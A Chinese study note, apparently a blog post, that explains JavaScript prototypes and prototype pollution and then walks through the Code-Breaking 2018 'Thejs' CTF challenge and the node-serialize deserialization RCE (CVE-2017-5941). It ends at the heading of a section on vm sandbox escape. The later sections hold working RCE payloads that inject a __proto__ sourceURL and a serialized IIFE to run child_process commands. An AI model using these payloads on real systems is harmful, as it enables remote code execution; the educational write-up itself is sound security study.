泛指一种数据结构，与JSON类无关），我们称为“对象”，为了与类创建的实例（也称为“对象”）作区分，我们称类创建的实例为“实例”，“实例”也是“对象” 也就是说，函数Calculator本身就具有一种 JSON 结构，它具有它的 JSON 属性、JSON 方法 我们把注意力放在let calc = new Calculator(1)这一行上 事实上，这两种实现方法（用class语法和用函数实现）的Calculator最终具有相同的 JSON 结构，其中，基于函数的实现更接近 JavaScript 的本真逻辑，而class更像是一种语法糖 **注意：**此处不要将两种实现方式的Calculator分别命名成Calculator1和Calculator2，然后通过Calculator1 == Calculator2或者Calculator1 === Calculator2去比较，它将永远返回false，因为两者的地址是不一样的，正如[] == []和({}) == ({})的返回值也是false一样 那么，根据我们所注意到的几个细节，我们猜测： 进行 new 操作时，JavaScript 创建了一个新的 JSON 结构，这个结构继承自Calculator的prototype属性——这一过程引入了方法 随后，以这个新创建的 JSON 结构为this，传递参数num=1并运行构造器constructor中的内容——这一过程引入了属性 至于静态方法则很好理解，我们调用静态方法写的是Calculator.add``Calculator.sub，那么这些静态方法也自然引入于Calculator的 JSON 结构本身之中 实例创建后，为了追溯这一过程，新创建的实例的 JSON 结构会带有constructor属性，指向创建它的构造器，在此处为Calculator（函数）；带有__proto__属性，指向它的原型，也就是它继承过来的地方，在此处为Calculator.prototype 接下来我们进行验证 我们注意到，基于函数实现的写法中，new Calculator(1)的Calculator本身是一个函数，事实上它就是constructor函数本身 let calc = new Calculator(1) // 创建实例（不论是哪种类的实现方法） console.log(calc.constructor === Calculator) 即使用class语法创建，我们也能够看到方法位于Calculator的prototype之中 let calc = new Calculator(1) // 创建实例（使用 class 语法） console.log(calc.applyAdd === Calculator.prototype.applyAdd) console.log(calc.applySub === Calculator.prototype.applySub) 结合上面的结论，显然，下面表达式的运行结果也是true calc.applyAdd === calc.constructor.prototype.applyAdd calc.applySub === calc.constructor.prototype.applySub 接下来我们验证calc下面的__proto__，它指向了它的原型 let calc = new Calculator(1) // 创建实例（不论是哪种类的实现方法） console.log(calc.__proto__ === Calculator.prototype) console.log(calc.__proto__ === calc.constructor.prototype) 我们看到，new 的过程实际上就是根据类创建一个 JavaScript 对象（JSON 结构）的过程，它具有以下步骤： 为实例添加方法：以类的prototype作为原型“复制”出一个新的对象（JSON 结构） 为实例添加属性、进行初始化操作：运行类的构造器constructor 为实例“添加”constructor和__proto__属性，分别指向创建它时的构造器和原型 事实上，上述的描述并不准确，我们将在稍后予以纠正 3.3 构造器 constructor 刚才的 new 操作完全可以写成 let calc2 = new calc.constructor() 这意味着，创建一个类的含义就是创建了一个构造器函数，创建一个实例的含义就是在继承的基础上运行了这个构造器函数 为了确保继承过程顺利进行，这个构造器函数必须含有以下特征 包含prototype属性 而在 JavaScript 中，任意函数都默认具有prototype属性，因此，任意函数都符合一个构造器的标准，任意函数都是一个构造器，可用于生成类实例 function TestClass() {} let test = new TestClass() 以上代码并不会报错 在 JavaScript 中，继承这个概念贯彻在许多操作中，每一个新的 JSON 结构的诞生，都进行了类似 new 的逻辑，因此，任何一个对象（除了null）都具有constructor属性，包括构造器本身 构造器本身是一个函数，当我们循环访问constructor时将得到 JavaScript 预定义的构造器Function，而Function的构造器仍然是它本身 Function.constructor === Function 以上表达式将返回true 我们可以总结出如下现象 构造器链的尽头是Function Function的构造器是Function本身 下面这张图更加地趋近本质，可以稍后再来体悟 3.4 原型和继承 当我们谈论 JavaScript 的原型，实际上是在谈论对象（JSON 结构）之间的特殊关系，有继承就有原型，有原型就有继承 原型的定义大致可以描述为：A和B是两个 JSON 结构，B继承于A，具有A的全部内容，那么称A就是B的原型 在 JavaScript 中，一个 JSON 结构就可以称为是一个具体的对象，甚至包括Number``String null是一个特殊的对象，它表示空，如果把对象之间的继承关系画一个遗传系谱图，那么null就是这张图上最原始的祖先 我们具有构造器函数Calculator，它也是一个 JSON 结构（对象），具有一个属性prototype，我们可以将这个属性理解为创建实例时的“模板”，当创建实例时，实例会继承这个“模板”的全部内容 当我们单独说谁是原型时，其实并没有意义，Calculator的prototype不是Calcualtor的原型，而是Calculator所要创建的实例（calc）的原型，事实上，这里命名为prototype（英文译为“原型”）造成了重大的歧义，经常对初学者甚至从业多年的程序员造成巨大困扰，为了方便表述、避免歧义，我们之后将把构造器的prototype称为构造器的“原型模板” 构造器Calculator创建出实例calc后，calc含有一个属性__proto__，这个属性即为calc的原型 刚才我们也提到Calculator.prototype也是calc的原型，所以它们两个是等价的，下面的表达式将返回true calc.__proto__ === Calculator.prototype 我们可以用一张图描述这种关系，下图中的prototype和__proto__在内存中具有完全相同的地址，只是它们所隶属的 JSON 结构不一样 当访问calc下的applyAdd，如果calc自己没有applyAdd，则会从它的原型中去查找，从而实现继承 几乎所有 JavaScript 中的对象都有原型，在 JavaScript 中，可以访问任何对象的__proto__属性查看它的原型 另一方面，有原型就有继承，有继承就有相应的构造器，我们可以访问任何对象的constructor属性查看它的构造器 3.5 原型对象 prototype 和 proto 首先我们需要分辨清楚prototype和__proto__的区别，以Calculator为例，这个构造器函数的原型并不是Calculator.prototype，而是Calculator.__proto__，calc的原型是calc.__proto__等于Calculator.prototype 每一个实例都由它所对应的构造器所创建，因此每一个实例都具有constructor和__proto__属性，实例的constructor.prototype的地址与实例的__proto__一致 但值得注意的是，当我们循环访问__proto__时，最终将指向null，而当我们循环访问constructor.prototype时，最终将会给出相同的结果 这是因为一个构造器的“原型模板”的构造器就是构造器本身 Number.prototype.constructor === Number Object.prototype.constructor === Object Function.prototype.constructor === Function Calculator.prototype.constructor === Calculator calc.constructor.prototype.constructor === calc.constructor 以上表达式都将返回true 这种“循环自引用”的逻辑或许会有些难以理解和记忆，但它这么设计是有它的意义所在的 如果我们将prototype的constructor修改成其它的将会发生什么？例如 Calculator.prototype.constructor = Number let calc = new Calculator(1) 然后我们访问calc.constructor，它将返回Number构造器 让我们查看calc的 JSON 结构 **注意：**这里的&lt;prototype&gt;（在chromium内核的浏览器可能显示的是[[Prototype]]），其实就是calc的原型calc.__proto__亦即Calculator.prototype 因此，calc的contructor属性并不是被添加上去的，而是继承自prototype的，这是对先前“new 做了什么”的总结的第一个修正，这也说明了为什么一个构造器的prototype.constructor默认指向这个构造器本身 与constructor.prototype不同的是，__proto__将直接指向当前的 JSON 结构继承自哪里 // Calculator 请重新声明以覆盖前面对 prototype.constructor 的修改 let calc = new Calculator(1) calc.constructor.prototype === calc.__proto__ calc.constructor.prototype.constructor.prototype === calc.__proto__.__proto__ calc.constructor.prototype.constructor.prototype === calc.constructor.prototype 运行结果如下 对于第一条运行结果是显然的 对于第三条运行结果，正如我们刚才所提到的，prototype的constructor将指向calc.constructor，从而形成一种“循环自引用” 对于第二条运行结果，我们观察calc.__proto__.__proto__的内容 我们注意到，calc.__proto__就是Calculator.prototype，它是一个 JSON 结构，这个 JSON 结构的原型应当是一个 JavaScript 预定义的构造器Object创建的 calc.__proto.__proto__ === Object.prototype //true 至于为什么calc.__proto__（即Calculator.prototype）的constructor属性不默认指向Object以追求统一，这或许就是先前提到的 JavaScript 的内在逻辑为了继承方便的特性吧 现在，我们进行第二个对先前“new 做了什么”的总结的纠错 我们检查calc这个对象（JSON 结构）本身的层级是否具有__proto__属性 Object.hasOwnProperty.call(calc, '__proto__') //false 可见其实calc本身并不具有__proto__属性 在 JavaScript 中，当我们访问一个对象的A属性，如果当前对象的 JSON 结构中找不到A属性，JavaScript 会从它的原型中去寻找 由于这个特性的存在，如果它的原型（也是一个 JSON 结构）中找不到，会从它的原型的原型中去找，直到原型为null也没有找到则返回undefined **注意：**事实上，“原型”这个概念指的是程序运行的内在逻辑，而不是__proto__这些属性，是不容外部修改的，换句话说，__proto__默认指向了原型的地址，而并不是说改变__proto__则改变了原型 这一点可以通过修改Object.prototype.a = 1，然后运行Object.defineProperty(calc, '__proto__', { value: 123 })使得calc.__proto__的值变为123，然后访问calc.a进行验证，会发现它返回的结果是1 我们追溯它的原型 Object.hasOwnProperty.call(calc.__proto__, '__proto__') Object.hasOwnProperty.call(calc.__proto__.__proto__, '__proto__') Object.hasOwnProperty.call(calc.__proto__.__proto__.__proto__, '__proto__') 第一行返回了false，calc.__proto__即Calculator.prototype，它的原型的 JSON 结构本身也不具有__proto__属性 第二行返回了true，我们再次打印calc.__proto__.__proto__的结果 这个结果和Object.prototype一致 我们可以从Object.prototype的 JSON 结构中看到，它含有一个__proto__属性，但是它是一个 Getter，访问__proto__属性将运行这个 Getter 函数，将这个函数的返回值作为__proto__属性的值 所谓 Getter，就是指一个属性的值与一个函数相绑定，访问这个属性，它的值会通过一个函数动态获取，这个函数称为这个属性的 Getter 函数 相应的，还有 Setter 这一概念，当通过赋值语句=对这个属性进行赋值时，实际上是以=后面的值为函数的参数调用了它的 Setter 函数 对于__proto__这一 Getter，它的逻辑在 JavaScript 解释器的代码中得到定义，而并不是 JavaScript 语言本身能够定义的 我们可以通过运行如下代码判断一个它是不是一个 Getter Object.getOwnPropertyDescriptor(Object.prototype, '__proto__') 运行结果如下 显然__proto__的值是通过get: __proto__()动态获取的 我们运行Object.getOwnPropertyDescriptor(Object.prototype, '__proto__').get.call(calc)（意思是以calc为这个 Getter 的 this 指针运行这个 Getter 函数）的结果和cal.__proto__一样 因此，calc中的__proto__实际上是通过 JavaScript 中层层向原型访问的机制寻找到的，它最终通过原型链指向了Object.prototype中的__proto__这一带有 Getter 的属性 我们可以通过下面的代码将Object.prototype的__proto__修改为一个确定的、不带有 Getter 的值 Object.defineProperty(Object.prototype, '__proto__', { value: 123 }) 然后我们会发现众多对象的__proto__都变成了123，包括calc和Calculator.prototype 为了探查calc继承的逻辑，我们刷新一下网页或者重置一下 JavaScript 环境，重新创建Calculator对象和calc实例，运行如下代码对Calculator.prototype的__proto__进行修改 Object.defineProperty(Calculator.prototype, '__proto__', { value: 123 }) 然后访问calc.__proto__，会发现它返回了123 由此我们对“new 做了什么”进行第二次修正：实际上__proto__属性也不是被添加上去的，而是继承自构造器的prototype属性 再一次刷新网页或者重置 JavaScript 环境，查看Object.prototype的__proto__值 Object.prototype.__proto__ 综合上述探索和测试，我们得到如下结论 一个构造器的prototype的构造器指向这个构造器本身 访问__proto__会通过原型链继承Object.prototype.__proto__的结果 __proto__的尽头是null 在默认情况下，一个对象（JSON 结构）的原型可通过它的__proto__属性反映 3.6 继承与原型链：new 到底做了什么 通过上面的探索，我们可以给出“new 做了什么”的最终答案： new 的过程实际上就是根据构造器的prototype属性创建一个 JavaScript 对象（JSON 结构）的过程，它具有以下步骤： 创建一个空的 JSON 结构 以这个新的 JSON 结构为 this，运行类的构造器constructor 在程序内部将这个 JSON 结构的原型指向构造器的prototype 返回这个新的 JSON 结构 实例的属性由constructor函数对this添加属性而直接添加于实例（新的 JSON 结构）之下，属性是这个实例独有的，由相同构造器创建的其它实例具有它们独有的属性，互不影响 实例的方法继承自构造器的prototype，改变构造器中的prototype的内容将影响到所有由这个构造器创建的实例 当我们访问这个实例的constructor属性时，JavaScript 并没有在这个实例的 JSON 结构中找到对应的属性，转而向它的原型（构造器的prototype）寻找，并找到了constructor属性，然后返回它的值 当我们访问这个实例的__proto__属性时，JavaScript 并没有在这个实例的的 JSON 结构中找到对应的属性，转而向它的原型（构造器的prototype）寻找，在它的原型中也没有找到，转而继续向它的原型的原型（Object.prototype）寻找，并找到了prototype属性，并返回它的值，由于它是一个 Getter，所以 JavaScript 以所访问的实例为 this 返回了这个 Getter 函数的返回值 我们访问实例的constructor和__proto__属性的过程反映了 JavaScript 中的一个重要概念：原型 3.7 原型链污染 原型链指的是由多个__proto__连在一起而形成的链式原型访问，如calc.__proto__.__proto__ 在默认情况下，一个对象（JSON 结构）的__proto__所指向的地址与对象原型的地址是一致的 由 JavaScript 的原型链查找建立起来的秩序使得构造器和实例处于一种稳定的关系之中，虽然我们通过Object.defineProperty(obj, '__proto__', { value })的方式改变一个对象的__proto__属性并不能改变这个对象的原型，但是我们却能够通过__proto__访问到它的原型 如果我们对它的原型进行一些修改，就能达到改变程序逻辑的目的，从而触发一些漏洞，这种人为通过原型链修改原型的行为成为原型链污染，是一种常见的攻击手段 对于大多数非 JavaScript 预定义的对象，可以通过__proto__或者constructor.prototype访问它的原型，对它原型下的属性进行修改可以造成原型链污染 emmm总的来说，代码基础有点差，从2.5之后看的就有点困难了，因此我再结合p神的看一遍吧。。。。 0x04 深入理解 JavaScript Prototype 污染攻击 4.1 prototype和__proto__分别是什么 JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义： function Foo() { this.bar = 1 } new Foo() Foo函数的内容，就是Foo类的构造函数，而this.bar就是Foo类的一个属性。 为了简化编写JavaScript代码，ECMAScript 6后增加了class语法，但class其实只是一个语法糖。 一个类必然有一些方法，类似属性this.bar，我们也可以将方法定义在构造函数内部： function Foo() { this.bar = 1 this.show = function() { console.log(this.bar) } } (new Foo()).show() 但这样写有一个问题，就是每当我们新建一个Foo对象时，this.show = function...就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在“类”中。 我希望在创建类的时候只创建一次show方法，这时候就则需要使用原型（prototype）了： function Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() 我们可以认为原型prototype是类Foo的一个属性，而所有用Foo类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的foo对象，其天生就具有foo.show()方法。 我们可以通过Foo.prototype来访问Foo类的原型，但Foo实例化出来的对象，是不能通过prototype访问原型的。这时候，就该__proto__登场了。 一个Foo类实例化出来的foo对象，可以通过foo.__proto__属性来访问Foo类的原型，也就是说： foo.__proto__ == Foo.prototype 所以，总结一下： prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法 一个对象的__proto__属性，指向这个对象所在的类的prototype属性 4.2 JavaScript原型链继承 所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。 比如： function Father() { this.first_name = 'Donald' this.last_name = 'Trump' } function Son() { this.first_name = 'Melania' } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.first_name} ${son.last_name}`) Son类继承了Father类的last_name属性，最后输出的是Name: Melania Trump。 总结一下，对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作： 在对象son中寻找last_name 如果找不到，则在son.__proto__中寻找last_name 如果仍然找不到，则继续在son.__proto__.__proto__中寻找last_name 依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。 以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可： 每个构造函数(constructor)都有一个原型对象(prototype) 对象的__proto__属性，指向类的原型对象prototype JavaScript使用prototype链实现继承机制 4.3 原型链污染是什么 第一章中说到，foo.__proto__指向的是Foo类的prototype。那么，如果我们修改了foo.__proto__中的值，是不是就可以修改Foo类呢？ 做个简单的实验： // foo是一个简单的JavaScript对象 let foo = {bar: 1} // foo.bar 此时为1 console.log(foo.bar) // 修改foo的原型（即Object） foo.__proto__.bar = 2 // 由于查找顺序的原因，foo.bar仍然是1 console.log(foo.bar) // 此时再用Object创建一个空的zoo对象 let zoo = {} // 查看zoo.bar console.log(zoo.bar) 最后，虽然zoo是一个空对象{}，但zoo.bar的结果居然是2： 原因也显而易见：因为前面我们修改了foo的原型foo.__proto__.bar = 2，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。 后来，我们又用Object类创建了一个zoo对象let zoo = {}，zoo对象自然也有一个bar属性了。 那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。 4.4 哪些情况下原型链会被污染 在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？ 我们思考一下，哪些情况下我们可以设置__proto__的值呢？其实找到能够控制数组（对象）的“键名”的操作即可： 对象merge–合并 对象clone（其实内核就是将待操作的对象merge到一个空对象中） 以对象merge为例，我们想象一个简单的merge函数： function merge(target, source) { for (let key in source) { if (key in source &amp;&amp; key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } } 在合并的过程中，存在赋值的操作target[key] = source[key]，那么，这个key如果是__proto__，是不是就可以原型链污染呢？ 我们用如下代码实验一下： let o1 = {} let o2 = {a: 1, \"__proto__\": {b: 2}} merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) 结果是，合并虽然成功了，但原型链没有被污染： 这是因为，我们用JavaScript创建o2的过程（let o2 = {a: 1, \"__proto__\": {b: 2}}）中，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。 那么，如何让__proto__被认为是一个键名呢？ 我们将代码改成如下： let o1 = {} let o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}') merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) 可见，新建的o3对象，也存在b属性，说明Object已经被污染： 这是因为，JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。 merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。 4.5 Code-Breaking 2018 Thejs 分析 下面是p神出的题目，这里我也只是清楚了漏洞利用点，至于payload暂时不理解。。。 我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考这里）： // ... const lodash = require('lodash') // ... app.engine('ejs', function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =&gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled({...options}) return callback(null, rendered) }) }) //... app.all('/', (req, res) =&gt; { let data = req.session.data || {language: [], category: []} if (req.method == 'POST') { data = lodash.merge(data, req.body) req.session.data = data } res.render('index', { language: data.language, category: data.category }) }) lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具： lodash.template 一个简单的模板引擎 lodash.merge 函数或对象的合并 其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。 而这里的lodash.merge操作实际上就存在原型链污染漏洞。 在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的lodash.template中。我们看到lodash.template的代码：https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165 // Use a sourceURL for easier debugging. var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + ' ' : ''; // ... var result = attempt(function() { return Function(importsKeys, sourceURL + 'return ' + source) .apply(undefined, importsValues); }); options是一个对象，sourceURL取到了其options.sourceURL属性。这个属性原本是没有赋值的，默认取空字符串。 但因为原型链污染，我们可以给所有Object对象中都插入一个sourceURL属性。最后，这个sourceURL被拼接进new Function的第二个参数中，造成任意代码执行漏洞。 我将带有__proto__的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便： 可见，我们代码执行成功，返回了id命令的结果。 4.6 Tips 文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点： 在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。 例子： object.prototype.name=value 在javascript，每一个实例对象都有一个__proto__属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象： objectname[\"__proto__\"] objectname.__proto__ objectname.constructor.prototype 不同对象所生成的原型链如下(部分)： var o = {a: 1}; // o对象直接继承了Object.prototype // 原型链： // o ---&gt; Object.prototype ---&gt; null var a = [\"yo\", \"whadup\", \"?\"]; // 数组都继承于 Array.prototype // 原型链： // a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null function f(){ return 2; } // 函数都继承于 Function.prototype // 原型链： // f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null 0x05 进一步理解-简化版 5.1 原型链污染原理 对于语句：object[a][b] = value 如果可以控制a、b、value的值，将a设置为__proto__，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。 来看一个简单的例子： object1 = {\"a\":1, \"b\":2}; object1.__proto__.foo = \"Hello World\"; console.log(object1.foo); object2 = {\"c\":1, \"d\":2}; console.log(object2.foo); ​ 最终会输出两个Hello World。为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。 5.2 Code-Breaking 2018 Thejs 这回再跟着先知社区的佬过一遍 题目源码下载：http://code-breaking.com/puzzle/9/ 直接npm install可以把需要的模块下载下来。 server.js const fs = require('fs') const express = require('express') const bodyParser = require('body-parser') const lodash = require('lodash') const session = require('express-session') const randomize = require('randomatic') const app = express() app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json()) app.use('/static', express.static('static')) app.use(session({ name: 'thejs.session', secret: randomize('aA0', 16), resave: false, saveUninitialized: false })) app.engine('ejs', function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =&gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled({...options}) return callback(null, rendered) }) }) app.set('views', './views') app.set('view engine', 'ejs') app.all('/', (req, res) =&gt; { // 定义session let data = req.session.data || {language: [], category: []} if (req.method == 'POST') { // 获取post数据并合并 data = lodash.merge(data, req.body) req.session.data = data // 再将data赋值给session } res.render('index', { language: data.language, category: data.category }) }) app.listen(3000, () =&gt; console.log('Example app listening on port 3000!')) 问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。 页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中。 如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。 var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + ' ' : ''; 如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。 继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中： var result = attempt(function() { return Function(importsKeys, sourceURL + 'return ' + source) .apply(undefined, importsValues); }); 通过构造chile_process.exec()就可以执行任意代码了。 最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)： {\"__proto__\":{\"sourceURL\":\" global.process.mainModule.constructor._load('child_process').exec('calc')//\"}} (这里直接用require会报错：ReferenceError: require is not defined p神给了一个更好的payload： {\"__proto__\":{\"sourceURL\":\" return e=&gt; {for (var a in {}) {delete Object.prototype[a];} return global.process.mainModule.constructor._load('child_process').execSync('id')} //\"}} 下面跟着佬过一遍CVE漏洞，有时间下去复现。 5.3 node-serialize反序列化RCE漏洞(CVE-2017-5941) 漏洞出现在node-serialize模块0.0.4版本当中，使用npm install node-serialize@0.0.4安装模块。 了解什么是IIFE： IIFE（立即调用函数表达式）是一个在定义时就会立即执行的 JavaScript 函数。 IIFE一般写成下面的形式： (function(){ /* code */ }()); // 或者 (function(){ /* code */ })(); node-serialize@0.0.4漏洞点 漏洞代码位于node_modules ode-serialize\\lib\\serialize.js中： 其中的关键就是：obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个function(){}()函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload： 构造Payload serialize = require('node-serialize'); var test = { rce : function(){require('child_process').exec('ls /',function(error, stdout, stderr){console.log(stdout)});}, } console.log(\"序列化生成的 Payload: \" + serialize.serialize(test)); 生成的Payload为： {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /',function(error, stdout, stderr){console.log(stdout)});}\"} 因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个()，结果如下： {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /',function(error, stdout, stderr){console.log(stdout)});}()\"} (这里不能直接在对象内定义IIFE表达式，不然会序列化失败) 传递给unserialize(注意转义单引号)： var serialize = require('node-serialize'); var payload = '{\"rce\":\"_$$ND_FUNC$$_function(){require(\\'child_process\\').exec(\\'ls /\\',function(error, stdout, stderr){console.log(stdout)});}()\"}'; serialize.unserialize(payload); 执行命令成功，结果如图： 0x06 vm沙箱逃逸 6.1 沙箱逃逸初识 说到沙箱逃逸，我们先来明确一些基本的概念。 JavaScript和Nodejs之间有什么区别：JavaScript用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此JavaScript也可以作为一门后端语言，写在后端（服务端）的JavaScript就叫做Nodejs。 什么是沙箱（sandbox）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。 沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。 在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。 6.2 Node将字符串执行为代码 我们先来看两个在node中将把字符串执行成代码的方式。 方法一 eval 首先我在目录下创建一个age.txt var age = 18 创建一个y1.js const fs = require('fs') let content = fs.readFileSync('age.txt', 'utf-8') console.log(content) eval(content) console.log(age) 可以发现我们通过eval执行了一个字符串，但是这种执行方式如果在当前作用域下已经有了同名的age变量，这个程序就会报错。 在js中每一个模块都有自己独立的作用域，所以用eval执行字符串代码很容易出现上面的这个问题，我们再看另外一种方法。 方法二：new Function 上面的方法因为模块间的作用域被限制了使用，那么我们考虑一下如果能够自己创建一个作用域是不是就可以更加方便的执行代码呢？new Function的第一个参数是形参名称，第二个参数是函数体。 我们都知道函数内和函数外是两个作用域，不过当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，当参数过多时这种方法就变的麻烦起来了。 从上面两个执行代码的例子可以看出来其实我们的思想就是如何创建一个能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域，这也就是vm模块的作用。 6.3 Nodejs作用域 说到作用域，我们就要说一下Nodejs中的作用域是怎么分配的（在Nodejs中一般把作用域叫上下文）。 在Web端（浏览器），发挥作用的一般是JavaScript，学过JavaScript的师傅应该都知道我们打开浏览器的窗口是JavaScript中最大的对象window，那么在服务端发挥作用的Nodejs它的构造和JavaScript不太一样。 我们在写一个Nodejs项目时往往要在一个文件里ruquire其他的js文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的上下文，包之间的作用域是互相隔离不互通的，也就是说就算我在y1.js中require了y2.js，那么我在y1.js中也无法直接调用y2.js中的变量和函数，举个例子。 在同一级目录下有y1.js和y2.js两个文件 y1.js var age = 20 y2.js const a = require(\"./y1\") console.log(a.age) 运行y2.js发现报错 age 值为undefined 那么我们想y2中引入并使用y1中的元素应该怎么办呢，Nodejs给我们提供了一个将js文件中元素输出的接口exports ，把y1修改成下面这样： y1.js var age = 20 exports.age = age 我们再运行y2就可以拿到age的值了 我们用图来解释这两个包之间的关系就是 这个时候就有人会问左上角的global是什么？这里就要说到Nodejs中的全局对象了。 刚才我们提到在JavaScript中window是全局对象，浏览器其他所有的属性都挂载在window下，那么在服务端的Nodejs中和window类似的全局对象叫做global，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用global.xxx的方式来访问，直接用xxx就可以调用这个变量。举个例子，console就是挂载在global下的一个全局变量，我们在用console.log输出时并不需要写成global.console.log，其他常见全局变量还有process（一会逃逸要用到）。 我们也可以手动声明一个全局变量，但全局变量在每个包中都是共享的，所以尽量不要声明全局变量，不然容易导致变量污染。用上面的代码举个例子： y1.js global.age = 20 y2.js const a = require(\"./y1\") console.log(age) 输出： 可以发现我这次在y1中并没有使用exports将age导入，并且y2在输出时也没有用a.age，因为此时age已经挂载在global上了，它的作用域已经不在y1中了。 我们输出一下global对象，可以看到age确实挂载在了global上： &lt;ref *1&gt; Object [global] { global: [Circular *1], clearInterval: [Function: clearInterval], clearTimeout: [Function: clearTimeout], setInterval: [Function: setInterval], setTimeout: [Function: setTimeout] { [Symbol(nodejs.util.promisify.custom)]: [Getter] }, queueMicrotask: [Function: queueMicrotask], performance: Performance { nodeTiming: PerformanceNodeTiming { name: 'node', entryType: 'node', startTime: 0, duration: 25.98190000653267, nodeStart: 0.4919999986886978, v8Start: 2.0012000054121017, bootstrapComplete: 18.864999994635582, environment: 10.277099996805191, loopStart: -1, loopExit: -1, idleTime: 0 }, timeOrigin: 1665558311872.296 }, clearImmediate: [Function: clearImmediate], setImmediate: [Function: setImmediate] { [Symbol(nodejs.util.promisify.custom)]: [Getter] }, age: 20 } 6.4 vm沙箱逃逸 